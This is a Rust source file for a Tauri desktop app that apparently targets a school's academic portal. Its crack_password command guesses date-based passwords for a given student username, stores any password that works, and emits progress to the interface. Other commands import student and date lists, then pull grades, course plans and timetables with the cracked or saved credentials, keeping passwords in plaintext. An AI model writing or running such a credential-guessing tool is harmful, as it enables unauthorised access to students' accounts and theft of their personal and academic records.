mod db;
mod cracker;
mod grades;
mod schedule;

use db::Database;
use cracker::{PasswordCracker, CrackProgress};
use grades::{fetch_grades, GradeFetchResult};
use serde::{Deserialize, Serialize};
use tauri::Emitter;
use std::sync::Arc;
use tokio::sync::Mutex;

#[derive(Serialize, Deserialize)]
struct CrackRequest {
    username: String,
    name: Option<String>,
    year: i32,
    concurrency: i32,
}

#[derive(Serialize)]
struct ImportSummary {
    inserted: usize,
    updated: usize,
}

#[derive(Serialize)]
struct GradeSyncSummary {
    inserted: usize,
    updated: usize,
    total: usize,
}

#[derive(Deserialize)]
struct GradeSyncRequest {
    username: String,
    password: String,
}

fn open_database() -> Result<Database, String> {
    let db_path = db::resolve_db_path()?;
    Database::new(&db_path).map_err(|e| format!("Failed to open database: {}", e))
}

#[tauri::command]
async fn crack_password(request: CrackRequest, window: tauri::Window) -> Result<String, String> {
    let db = open_database()?;

    if let Ok(Some(existing)) = db.get_result_by_username(&request.username) {
        let existing_date = existing
            .password_date
            .as_deref()
            .unwrap_or("")
            .trim();
        if !existing_date.is_empty() {
            let progress = CrackProgress {
                current_password: existing.password_date.clone().unwrap_or_default(),
                total_attempted: 0,
                total_passwords: 0,
                found: true,
                result: Some(existing.password_date.clone().unwrap_or_default()),
                elapsed_seconds: 0,
            };
            let _ = window.emit("crack_progress", &progress);
            return Ok(format!("已存在记录，直接返回: {}", existing_date));
        }
    }

    let cracker = PasswordCracker::new(request.username.clone(), request.year);
    let passwords = cracker.generate_date_passwords();
    let total_passwords = passwords.len() as i32;

    let headers = [
        ("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),
        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"),
        ("Accept-Language", "zh-CN,zh-TW;q=0.9,zh-HK;q=0.8,zh;q=0.7"),
    ];

    let mut default_headers = reqwest::header::HeaderMap::new();
    for (key, value) in &headers {
        let header_name = reqwest::header::HeaderName::from_bytes(key.as_bytes())
            .map_err(|e| format!("Invalid header name {}: {}", key, e))?;
        let header_value = reqwest::header::HeaderValue::from_str(value)
            .map_err(|e| format!("Invalid header value for {}: {}", key, e))?;
        default_headers.insert(header_name, header_value);
    }

    let client = reqwest::Client::builder()
        .default_headers(default_headers)
        .build()
        .map_err(|e| format!("Failed to create HTTP client: {}", e))?;

    let found = Arc::new(Mutex::new(false));
    let start_time = std::time::Instant::now();
    for (index, password) in passwords.iter().enumerate() {
        if *found.lock().await {
            break;
        }

        let current_attempt = (index + 1) as i32;

        match cracker.try_password(password, &client).await {
            Ok(success) => {
                if success {
                    *found.lock().await = true;
                    
                    let encoded_value = cracker.encode_login_params(password);
                    let _ = db.insert_result(
                        &request.username,
                        request.name.as_deref().unwrap_or(""),
                        "",
                        password,
                        &encoded_value,
                        request.year,
                    );

                    let progress = CrackProgress {
                        current_password: password.clone(),
                        total_attempted: current_attempt,
                        total_passwords,
                        found: true,
                        result: Some(password.clone()),
                        elapsed_seconds: start_time.elapsed().as_secs() as i32,
                    };

                    let _ = window.emit("crack_progress", &progress);
                    return Ok(format!("查询成功: {}", password));
                }
            }
            Err(_) => {
                // 网络错误，继续尝试
            }
        }

        // 每尝试 10 个密码发送一次进度
        if index % 10 == 0 {
            let progress = CrackProgress {
                current_password: password.clone(),
                total_attempted: current_attempt,
                total_passwords,
                found: false,
                result: None,
                elapsed_seconds: start_time.elapsed().as_secs() as i32,
            };

            let _ = window.emit("crack_progress", &progress);
        }
    }

    if *found.lock().await {
        Ok("查询成功".to_string())
    } else {
        Ok(format!("未查询到结果，共尝试 {} 次", total_passwords))
    }
}

#[tauri::command]
fn get_crack_history() -> Result<Vec<db::PasswordResult>, String> {
    let db = open_database()?;

    db.get_all_results()
        .map_err(|e| format!("Failed to query database: {}", e))
}

#[tauri::command]
fn import_students(students: Vec<db::StudentImport>) -> Result<ImportSummary, String> {
    let mut db = open_database()?;

    let (inserted, updated) = db
        .upsert_students(&students)
        .map_err(|e| format!("Failed to import students: {}", e))?;

    Ok(ImportSummary { inserted, updated })
}

#[tauri::command]
fn import_dates(dates: Vec<db::DateImport>) -> Result<ImportSummary, String> {
    let mut db = open_database()?;

    let (inserted, updated) = db
        .upsert_dates(&dates)
        .map_err(|e| format!("Failed to import dates: {}", e))?;

    Ok(ImportSummary { inserted, updated })
}

#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[tauri::command]
async fn sync_grades(request: GradeSyncRequest) -> Result<GradeSyncSummary, String> {
    if request.username.trim().is_empty() || request.password.trim().is_empty() {
        return Err("请输入账号和密码".to_string());
    }
    let GradeFetchResult {
        grades,
        minor_codes,
        minor_names,
        major_plan,
        minor_plan,
    } = fetch_grades(request.username.trim(), request.password.trim()).await?;
    let mut db = open_database()?;
    let (inserted, updated) = db
        .upsert_grades(request.username.trim(), &grades)
        .map_err(|e| format!("Failed to save grades: {}", e))?;
    db.update_minor_flags(request.username.trim(), &minor_codes, &minor_names)
        .map_err(|e| format!("Failed to update minor flags: {}", e))?;
    db.replace_plan_courses(request.username.trim(), false, &major_plan)
        .map_err(|e| format!("Failed to save major plan: {}", e))?;
    db.replace_plan_courses(request.username.trim(), true, &minor_plan)
        .map_err(|e| format!("Failed to save minor plan: {}", e))?;
    db.ensure_user_in_password_results(request.username.trim())
        .map_err(|e| format!("Failed to update user: {}", e))?;
    db.save_user_password(request.username.trim(), request.password.trim())
        .map_err(|e| format!("Failed to save password: {}", e))?;
    Ok(GradeSyncSummary {
        inserted,
        updated,
        total: grades.len(),
    })
}

#[tauri::command]
async fn sync_grades_saved(username: String) -> Result<GradeSyncSummary, String> {
    let username = username.trim().to_string();
    if username.is_empty() {
        return Err("请输入账号".to_string());
    }
    let password = {
        let db = open_database()?;
        db.get_saved_password(&username)
            .map_err(|e| format!("Failed to read password: {}", e))?
    };
    let password = password
        .filter(|value| !value.trim().is_empty())
        .ok_or_else(|| "该账号未保存密码".to_string())?;

    let GradeFetchResult {
        grades,
        minor_codes,
        minor_names,
        major_plan,
        minor_plan,
    } = fetch_grades(&username, password.trim()).await?;
    let mut db = open_database()?;
    let (inserted, updated) = db
        .upsert_grades(&username, &grades)
        .map_err(|e| format!("Failed to save grades: {}", e))?;
    db.update_minor_flags(&username, &minor_codes, &minor_names)
        .map_err(|e| format!("Failed to update minor flags: {}", e))?;
    db.replace_plan_courses(&username, false, &major_plan)
        .map_err(|e| format!("Failed to save major plan: {}", e))?;
    db.replace_plan_courses(&username, true, &minor_plan)
        .map_err(|e| format!("Failed to save minor plan: {}", e))?;
    Ok(GradeSyncSummary {
        inserted,
        updated,
        total: grades.len(),
    })
}

#[tauri::command]
fn get_grade_users() -> Result<Vec<db::GradeUser>, String> {
    let db = open_database()?;
    db.get_grade_users()
        .map_err(|e| format!("Failed to query users: {}", e))
}

#[tauri::command]
fn get_grades(username: Option<String>) -> Result<Vec<db::GradeRecord>, String> {
    let db = open_database()?;
    match username {
        Some(name) if !name.trim().is_empty() => db
            .get_grades_by_username(name.trim())
            .map_err(|e| format!("Failed to query grades: {}", e)),
        _ => db
            .get_all_grades()
            .map_err(|e| format!("Failed to query grades: {}", e)),
    }
}

#[tauri::command]
fn get_pending_courses(username: String, category: String) -> Result<Vec<db::PlanCourse>, String> {
    let username = username.trim();
    if username.is_empty() {
        return Err("请输入账号".to_string());
    }
    let flag = match category.as_str() {
        "minor" => 1,
        "major" => 0,
        "all" => -1,
        _ => 0,
    };
    let db = open_database()?;
    db.get_pending_courses(username, flag)
        .map_err(|e| format!("Failed to query pending courses: {}", e))
}

#[tauri::command]
fn hide_grade_user(username: String) -> Result<(), String> {
    let username = username.trim();
    if username.is_empty() {
        return Err("请输入账号".to_string());
    }
    let mut db = open_database()?;
    db.hide_grade_user(username)
        .map_err(|e| format!("Failed to delete user: {}", e))
}

#[derive(Deserialize)]
struct UpdatePasswordResultRequest {
    username: String,
    name: Option<String>,
    class_name: Option<String>,
    password_date: Option<String>,
}

#[tauri::command]
fn update_password_result(request: UpdatePasswordResultRequest) -> Result<(), String> {
    let username = request.username.trim();
    if username.is_empty() {
        return Err("请输入账号".to_string());
    }
    let mut db = open_database()?;
    db.update_password_result(
        username,
        request.name.as_deref(),
        request.class_name.as_deref(),
        request.password_date.as_deref(),
    )
    .map_err(|e| format!("Failed to update user: {}", e))
}

#[tauri::command]
fn delete_password_result(username: String) -> Result<(), String> {
    let username = username.trim();
    if username.is_empty() {
        return Err("请输入账号".to_string());
    }
    let mut db = open_database()?;
    let (grade_count, plan_count) = db
        .count_user_relations(username)
        .map_err(|e| format!("Failed to check relations: {}", e))?;
    if grade_count > 0 || plan_count > 0 {
        return Err(format!(
            "存在关联记录（成绩 {} 条，执行计划 {} 条），不允许删除",
            grade_count, plan_count
        ));
    }
    db.delete_password_result(username)
        .map_err(|e| format!("Failed to delete user: {}", e))
}

#[derive(Deserialize)]
struct UpdateGradeRecordRequest {
    id: i32,
    score: Option<String>,
    score_flag: Option<String>,
    credit: Option<f32>,
    total_hours: Option<f32>,
    gpa: Option<f32>,
    makeup_term: Option<String>,
    exam_type: Option<String>,
    course_attr: Option<String>,
    course_nature: Option<String>,
}

#[tauri::command]
fn update_grade_record(request: UpdateGradeRecordRequest) -> Result<(), String> {
    let mut db = open_database()?;
    let input = db::UpdateGradeRecordInput {
        id: request.id,
        score: request.score,
        score_flag: request.score_flag,
        credit: request.credit,
        total_hours: request.total_hours,
        gpa: request.gpa,
        makeup_term: request.makeup_term,
        exam_type: request.exam_type,
        course_attr: request.course_attr,
        course_nature: request.course_nature,
    };
    db.update_grade_record(&input)
        .map_err(|e| format!("Failed to update grade: {}", e))
}

#[tauri::command]
fn delete_grade_record(id: i32) -> Result<(), String> {
    let mut db = open_database()?;
    db.delete_grade_record(id)
        .map_err(|e| format!("Failed to delete grade: {}", e))
}

#[derive(Deserialize)]
struct UpdatePlanCourseRequest {
    id: i32,
    course_name: Option<String>,
    credit: Option<f32>,
    total_hours: Option<f32>,
    exam_mode: Option<String>,
    course_nature: Option<String>,
    course_attr: Option<String>,
}

#[derive(Deserialize)]
struct SyncScheduleRequest {
    username: String,
    password: String,
    term: Option<String>,
}

#[tauri::command]
async fn sync_schedule(request: SyncScheduleRequest) -> Result<(), String> {
    let username = request.username.trim();
    let password = request.password.trim();
    if username.is_empty() || password.is_empty() {
        return Err("请输入账号和密码".to_string());
    }
    let fetch = schedule::fetch_schedule(username, password, request.term).await?;
    let mut db = open_database()?;
    db.upsert_schedule_terms(&fetch.terms)
        .map_err(|e| format!("Failed to save terms: {}", e))?;
    db.replace_schedule_entries(&fetch.term, &fetch.entries)
        .map_err(|e| format!("Failed to save schedule: {}", e))?;
    Ok(())
}

#[tauri::command]
fn get_schedule_terms() -> Result<Vec<db::ScheduleTerm>, String> {
    let db = open_database()?;
    db.get_schedule_terms()
        .map_err(|e| format!("Failed to query terms: {}", e))
}

#[tauri::command]
fn get_schedule_entries(term: String) -> Result<Vec<db::ScheduleEntry>, String> {
    let term = term.trim();
    if term.is_empty() {
        return Err("请选择学期".to_string());
    }
    let db = open_database()?;
    db.get_schedule_entries(term)
        .map_err(|e| format!("Failed to query schedule: {}", e))
}

#[derive(Deserialize)]
struct UpdateScheduleEntryRequest {
    id: i32,
    course_name: Option<String>,
    teacher: Option<String>,
    location: Option<String>,
    week_text: Option<String>,
    week_numbers: Option<Vec<i32>>,
}

#[tauri::command]
fn update_schedule_entry(request: UpdateScheduleEntryRequest) -> Result<(), String> {
    let mut db = open_database()?;
    let input = db::UpdateScheduleEntryInput {
        id: request.id,
        course_name: request.course_name,
        teacher: request.teacher,
        location: request.location,
        week_text: request.week_text,
        week_numbers: request.week_numbers,
    };
    db.update_schedule_entry(&input)
        .map_err(|e| format!("Failed to update schedule: {}", e))
}

#[tauri::command]
fn delete_schedule_entry(id: i32) -> Result<(), String> {
    let mut db = open_database()?;
    db.delete_schedule_entry(id)
        .map_err(|e| format!("Failed to delete schedule: {}", e))
}

#[tauri::command]
fn update_plan_course(request: UpdatePlanCourseRequest) -> Result<(), String> {
    let mut db = open_database()?;
    let input = db::UpdatePlanCourseInput {
        id: request.id,
        course_name: request.course_name,
        credit: request.credit,
        total_hours: request.total_hours,
        exam_mode: request.exam_mode,
        course_nature: request.course_nature,
        course_attr: request.course_attr,
    };
    db.update_plan_course(&input)
        .map_err(|e| format!("Failed to update plan: {}", e))
}

#[tauri::command]
fn delete_plan_course(id: i32) -> Result<(), String> {
    let mut db = open_database()?;
    db.delete_plan_course(id)
        .map_err(|e| format!("Failed to delete plan: {}", e))
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .setup(|_| {
            if let Err(err) = db::migrate_if_needed() {
                eprintln!("Database migration failed: {}", err);
            }
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            greet,
            crack_password,
            get_crack_history,
            import_students,
            import_dates,
            sync_grades,
            sync_grades_saved,
            get_grade_users,
            get_grades,
            get_pending_courses,
            hide_grade_user,
            update_password_result,
            delete_password_result,
            update_grade_record,
            delete_grade_record,
            update_plan_course,
            delete_plan_course,
            sync_schedule,
            get_schedule_terms,
            get_schedule_entries,
            update_schedule_entry,
            delete_schedule_entry
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
